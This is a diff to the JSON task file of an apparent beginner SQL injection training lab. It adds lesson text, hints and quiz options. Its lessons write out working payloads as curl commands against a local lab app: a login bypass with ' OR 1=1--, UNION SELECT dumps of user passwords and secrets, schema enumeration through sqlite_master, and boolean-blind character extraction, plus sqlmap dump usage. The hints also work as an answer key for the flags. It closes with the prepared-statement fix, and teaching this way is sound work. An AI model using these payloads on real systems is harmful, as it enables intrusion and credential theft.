@@ -4,54 +4,81 @@
   "tasks": {
     "1": {
       "title": "Detecting the injection",
+      "body": "## App reconnaissance\n\nStart the lab (Lab panel above) and browse:\n\n1. **Home** (`/`): the TechShop store with search and login.\n2. **Search** (`/search?q=laptop`): searches products. Notice the red text\n   `DEBUG: SELECT ...` — the app shows you the query.\n3. **Login** (`/login?username=X&password=Y`): a form.\n\n## Detecting the injection point\n\nTry it on `/search`:\n\n```bash\n# Normal\ncurl \"http://127.0.0.1:18081/search?q=laptop\"\n\n# With a single quote → SQL error\ncurl \"http://127.0.0.1:18081/search?q='\"\n```\n\nThe error reveals that your input goes STRAIGHT into the SQL query:\n\n```text\nSELECT id, name, price, description FROM products\nWHERE name LIKE '%'%' OR description LIKE '%'%'\n                                          ^ your quote breaks the syntax\n```\n\n**Boolean confirmation**:\n\n```bash\n# TRUE: returns products (1=1 is always true)\ncurl \"http://127.0.0.1:18081/search?q=' OR 1=1--\"\n\n# FALSE: returns nothing (1=2 is always false)\ncurl \"http://127.0.0.1:18081/search?q=' OR 1=2--\"\n```\n\nIf `OR 1=1` shows more results than `OR 1=2`, you control the WHERE clause.",
       "questions": {
         "sqli-basico-t01-q01": {
-          "prompt": "Which character inserted into a search field suggests SQLi by causing a syntax error?"
+          "prompt": "Which character, inserted into a search field, suggests SQLi by causing a syntax error?",
+          "hint": "The single quote breaks the SQL string."
         },
         "sqli-basico-t01-q02": {
-          "prompt": "What boolean payload returns ALL products (always true)?"
+          "prompt": "What boolean payload returns ALL products (always true)?",
+          "hint": "OR 1=... (think about which number makes it TRUE)."
         }
       }
     },
     "2": {
       "title": "Login bypass and UNION SELECT",
+      "body": "## Login bypass: getting in without a password\n\nThe `/login` endpoint is vulnerable too:\n\n```bash\n# The classic bypass\ncurl \"http://127.0.0.1:18081/login?username=' OR 1=1--&password=cualquiera\"\n```\n\nThe resulting SQL query:\n\n```sql\nSELECT id, username, email FROM users\nWHERE username='' OR 1=1--' AND password='cualquiera'\n                 ↑         ↑\n              empty string  comment: the rest is ignored\n```\n\n`1=1` is TRUE → it returns the first row → successful login as `admin`.\n\n## UNION SELECT: stealing the whole table\n\n`UNION SELECT` appends rows from ANOTHER query to the results. The number of\ncolumns has to match (the original query has 4: id, name, price, description):\n\n```bash\n# 1. Guess the columns (try 1,2,3,4... until there is no error)\ncurl \"http://127.0.0.1:18081/search?q=' UNION SELECT 1,2,3,4--\"\n\n# 2. Dump the users table\ncurl \"http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,password,secret FROM users--\"\n```\n\nIn the result you will see the users... and a `secret` column with **FLAG_1**.\n\n## How UNION works\n\n```sql\n-- The original query:\nSELECT id, name, price, description FROM products WHERE name LIKE '%...%'\nUNION\n-- Your injection adds:\nSELECT 1, username, password, secret FROM users\n```\n\nThe users rows show up MIXED with the products rows. The browser renders them\nall as if they were legitimate results. The app filters and sanitizes... nothing.",
       "questions": {
         "sqli-basico-t02-q01": {
-          "prompt": "What payload in username and password bypasses the login without valid credentials?"
+          "prompt": "On the login form, what payload in username and password bypasses it without valid credentials?",
+          "hint": "In username: ' OR 1=1-- and in password: anything."
         },
         "sqli-basico-t02-q02": {
-          "prompt": "Submit the flag hidden in the 'secret' column of the users table (UNION SELECT)."
+          "prompt": "Submit the flag hidden in the 'secret' column of the users table (UNION SELECT).",
+          "hint": "curl 'http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,password,secret FROM users--"
         }
       }
     },
     "3": {
-      "title": "Advanced extraction",
+      "title": "Advanced extraction and the second flag",
+      "body": "## Enumerating the database\n\nIn SQLite, the internal `sqlite_master` table holds the schema:\n\n```bash\n# List all tables\ncurl \"http://127.0.0.1:18081/search?q=' UNION SELECT 1,name,sql,4 FROM sqlite_master WHERE type='table'--\"\n```\n\nThis shows you the CREATE TABLE statement of each table — you know the columns without guessing.\n\n## Row-by-row extraction (LIMIT)\n\nWhen UNION returns too many rows, limit them:\n\n```bash\n# First row of users\ncurl \"http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,secret,4 FROM users LIMIT 1--\"\n\n# Second row\ncurl \"http://127.0.0.1:18081/search?q=' UNION SELECT 1,username,secret,4 FROM users LIMIT 1 OFFSET 1--\"\n```\n\n## The second flag: in the products\n\nOne of the products has a flag in its description:\n\n```bash\ncurl \"http://127.0.0.1:18081/search?q=hidden\"\n```\n\nThe description contains **FLAG_2** — visible even without injection (if you know what\nto look for). In real life: app descriptions, comments and metadata often contain\nsecrets nobody remembers leaving there.\n\n## How to prevent ALL of this\n\n```python\n# VULNERABLE (what the lab does):\nsql = f\"SELECT ... WHERE name LIKE '%{query}%'\"\n\n# SAFE (prepared statements):\ncursor = db.execute(\"SELECT ... WHERE name LIKE ?\", (f\"%{query}%\",))\n```\n\nThe difference is ONE line. Prepared statements separate CODE from DATA: user input\nis never interpreted as SQL. This is OWASP's #1 mitigation.",
       "questions": {
         "sqli-basico-t03-q01": {
-          "prompt": "Which SQL clause limits how many rows a query returns?"
+          "prompt": "Which SQL clause limits how many rows a query returns (useful for extracting data row by row)?",
+          "hint": "LIMIT"
         },
         "sqli-basico-t03-q02": {
-          "prompt": "Search the product descriptions for the hidden flag (hint: search for 'hidden')."
+          "prompt": "Search the product descriptions for the hidden flag (hint: search for 'hidden').",
+          "hint": "curl 'http://127.0.0.1:18081/search?q=hidden'"
         },
         "sqli-basico-t03-q03": {
-          "prompt": "Which SQLite function lists all tables in the database?"
+          "prompt": "Which internal SQLite table lists all the tables in the database?",
+          "hint": "sqlite_master (it is the equivalent of information_schema)."
         }
       }
     },
     "4": {
       "title": "Lab: Blind SQL Injection",
+      "body": "## Blind SQLi: when there are no errors and no data\n\nThe blind lab shows NO errors and NO data — only \"User exists\" or \"not found\".\nBut that difference IS an oracle that can extract the entire database:\n\n```bash\n# Does the users table have more than 0 rows?\ncurl \"http://127.0.0.1:18092/check?id=1+OR+(SELECT+COUNT(*)+FROM+users)>0\"\n# → \"User exists\" (TRUE)\n\n# Is the first character of admin's password 'a'?\ncurl \"http://127.0.0.1:18092/check?id=(SELECT+CASE+WHEN+(SUBSTR(password,1,1)='a')+THEN+1+ELSE+99+END+FROM+users+WHERE+id=1)\"\n# → \"not found\" (FALSE: it is not 'a')\n\n# Try 'p'... 'pa'... 'pas'... until you have extracted the full password\n```\n\nThis is what sqlmap does automatically with `--technique=B` (Boolean-based blind).",
       "questions": {
         "sqli-basico-t04-q01": {
-          "prompt": "What visible difference exists between TRUE and FALSE in boolean-based blind SQLi?"
+          "prompt": "In a boolean-based blind SQLi like the lab's, what visible difference is there between a TRUE and a FALSE condition?",
+          "hint": "Compare what /check returns for an id that exists with what it returns for one that does not.",
+          "options": {
+            "a": "The app returns a different SQL error message in each case",
+            "b": "The data from the users table appears directly in the response",
+            "c": "The page shows 'User exists' (TRUE) or 'User not found' (FALSE)",
+            "d": "None: the response is identical and it only shows up in the server logs"
+          }
         },
         "sqli-basico-t04-q02": {
-          "prompt": "In blind SQLi, how do you extract data character by character?"
+          "prompt": "In blind SQLi, how do you extract data character by character without seeing it directly?",
+          "hint": "Think of a function that cuts a single character out of a string and a condition that makes the response TRUE or FALSE.",
+          "options": {
+            "a": "With UNION SELECT, which prints the data directly on the page",
+            "b": "With SUBSTR + CASE WHEN: you ask whether each character is X and deduce it from the TRUE/FALSE response",
+            "c": "By triggering SQL errors that show the value in the error message",
+            "d": "With ORDER BY, which sorts the rows by the secret column"
+          }
         },
         "sqli-basico-t04-q03": {
-          "prompt": "Extract admin (id=1) password with the boolean oracle — character by character or with sqlmap. Submit it."
+          "prompt": "Use the boolean oracle to extract the password of user id=1 (it is a full flag; character by character or with sqlmap). Submit it.",
+          "hint": "SUBSTR(password,N,1)='x' per position — the password IS the flag. sqlmap -u 'http://127.0.0.1:18092/check?id=1' --technique=B --dump speeds it up"
         },
         "sqli-basico-t04-q04": {
-          "prompt": "The /status endpoint is also an oracle (active/not found) over the config table. Extract the api_key value char by char and submit the flag."
+          "prompt": "The /status endpoint is also an oracle (active/not found) over the config table. Extract the api_key value character by character and submit the flag.",
+          "hint": "service=api_key' AND (CASE WHEN SUBSTR(value,1,1)='F' THEN 1 ELSE 0 END)=1 -- → 'active' if you guess right. (The 3s sleep when the name contains 'sleep' is the time-based demo)"
         }
       }
     }
